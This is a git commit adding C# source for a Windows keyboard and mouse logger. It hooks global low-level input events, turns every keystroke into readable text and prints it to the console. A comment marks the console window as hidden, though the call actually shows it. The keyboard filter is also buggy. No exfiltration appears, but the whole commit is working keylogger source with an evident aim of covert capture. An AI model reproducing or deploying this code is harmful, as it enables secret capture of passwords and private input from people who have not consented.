3fbea876075d51b1adfff5a691b9a79d0be3c368
Frex <nico.fretti@gmail.com>
2021-12-17 11:20:25 +0100

    Push C# mouse and keyboard logger

---
+++ EventLogger/EventLogger/EventLogger/Program.cs
@@ -0,0 +1,76 @@
+﻿using System;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.IO;
+
+namespace EventLogger;
+
+class EventLogger
+{
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+ 
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+        IntPtr wParam, IntPtr lParam);
+ 
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+ 
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+    
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    
+    private static IntPtr _keyboardHook = IntPtr.Zero;
+    private static IntPtr _mouseHook = IntPtr.Zero;
+    
+    private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
+ 
+    public static void Main()
+    {
+        var handle = GetConsoleWindow();
+ 
+        // Hide
+        ShowWindow(handle, 1);
+        var process = Process.GetCurrentProcess();
+        
+        _keyboardHook = SetHandler(process.MainModule,(LowLevelProc)KeyBoardHandler, Utils.WH_KEYBOARD_LL);
+        _mouseHook = SetHandler(process.MainModule, (LowLevelProc)MouseHandler,Utils.WH_MOUSE_LL);
+        Application.Run();
+        UnhookWindowsHookEx(_keyboardHook);
+        UnhookWindowsHookEx(_mouseHook);
+        
+    }
+ 
+    private static IntPtr SetHandler(ProcessModule? module, LowLevelProc handler, int action)
+    {
+        return SetWindowsHookEx(action, handler, GetModuleHandle(module.ModuleName), 0);
+    }
+ 
+    private static IntPtr MouseHandler(int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        if(wParam==(IntPtr)Utils.WM_LBUTTONDOWN)
+        {
+            Console.WriteLine("[Mouse] Left button down");
+        }else if (wParam == (IntPtr)Utils.WM_RBUTTONDOWN)
+        {
+            Console.WriteLine("[Mouse] Right button down");
+        }
+        return CallNextHookEx(_mouseHook, nCode, wParam, lParam);
+    }
+    private static IntPtr KeyBoardHandler(int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        //Keyboard event
+        if (wParam == (IntPtr)Utils.WM_KEYDOWN || wParam!=(IntPtr)Utils.WM_KEYUP){
+            Utils.TransformInt((int)Marshal.ReadInt32(lParam));
+        }
+        return CallNextHookEx(_keyboardHook, nCode, wParam, lParam);
+    }
+}
---
+++ EventLogger/EventLogger/EventLogger/Utils.cs
@@ -0,0 +1,58 @@
+﻿using System.Windows.Forms;
+
+namespace EventLogger;
+
+public static class Utils
+{
+    public const int WH_KEYBOARD_LL = 13;
+    public const int WH_MOUSE_LL = 14;
+    public const int WM_KEYDOWN = 0x0100;
+    public const int WM_KEYUP = 0x0101;
+    public const int WM_LBUTTONDOWN = 0x0201;
+    public const int WM_RBUTTONDOWN = 0x0204;
+    
+    public static void TransformInt(int i) {
+        // function that transforms the int and return the string that will be written in the log file
+        // the function is called when the user press a key
+        String key = ((Keys) i).ToString();
+        if (key.Length == 1)
+        {
+            key = ((char) (i + 32)).ToString();
+        }
+        else
+            switch (key)
+            {
+                case "LControlKey":
+                case "RControlKey":
+                    key = "[Ctrl]";
+                    break;
+                case "LShiftKey":
+                case "RShiftKey":
+                    key = "[Shift]";
+                    break;
+                case "LMenu":
+                case "RMenu":
+                    key = "[Alt]";
+                    break;
+                case "LWin":
+                case "RWin":
+                    key = "[Win]";
+                    break;
+                case "Back":
+                    key = "[Backspace]";
+                    break;
+                case "Return":
+                    key = "[Enter]";
+                    break;
+                case "Escape":
+                    key = "[Esc]";
+                    break;
+                default:
+                    // action key is pressed
+                    key = "[" + key + "]";
+                    break;
+            }
+
+        Console.WriteLine(key);
+    }
+}
